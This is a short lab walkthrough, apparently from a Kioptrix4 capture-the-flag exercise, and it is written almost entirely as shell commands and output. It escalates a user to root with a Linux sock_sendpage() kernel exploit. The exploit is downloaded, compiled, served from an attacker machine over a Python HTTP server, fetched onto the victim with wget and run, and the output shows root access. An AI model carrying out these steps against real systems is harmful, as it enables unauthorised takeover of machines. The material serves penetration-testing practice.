@@ -1,0 +1,46 @@
+=============================LOCAL RING0 ROOT EXPLOIT======================
+1 Download exploit (Linux 2.4/2.6 sock_sendpage() Local ring0 Root Exploit)
+***************************************************************************
+root@noondi:~# wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9641.tar.gz
+
+2 Extract files
+***************
+root@noondi:/var/www/html/privesc# tar zxvf 9641.tar.gz
+linux-sendpage3/
+
+3 Compile exploit
+*****************
+root@noondi:/linux-sendpage3# ls
+exploit-pulseaudio.c  exploit.c  run  runcon-mmap_zero  sesearch-mmap_zero
+root@noondi:/linux-sendpage3# gcc -Wall -o exploit exploit.c
+
+4. Download exploit in a world writable environment here: /tmp
+**************************************************************
+john@Kioptrix4:/tmp$ wget http://192.168.209.179/privesc/exploit
+
+It doesnot work because port 80, 8080 are blocked but 8000 is not.
+
+On attacker's machine:
+Stop apache2 server from running and start python simple server.
+Command: python -m SimpleHTTPServer
+
+5. Download file on victim's machine again, give it write permissions:
+*********************************************************************
+john@Kioptrix4:/tmp$ wget http://192.168.209.179:8000/privesc/exploit
+
+john@Kioptrix4:/tmp$ chmod +x exploit
+john@Kioptrix4:/tmp$ ls
+check  exploit  unix-privesc-check
+
+john@Kioptrix4:/tmp$ 
+john@Kioptrix4:/tmp$ id
+uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
+
+6 Run the exploit and you have root
+**********************************
+john@Kioptrix4:/tmp$ 
+john@Kioptrix4:/tmp$ ./exploit
+# 
+# id
+uid=0(root) gid=0(root) groups=115(admin),1001(john)
+# 
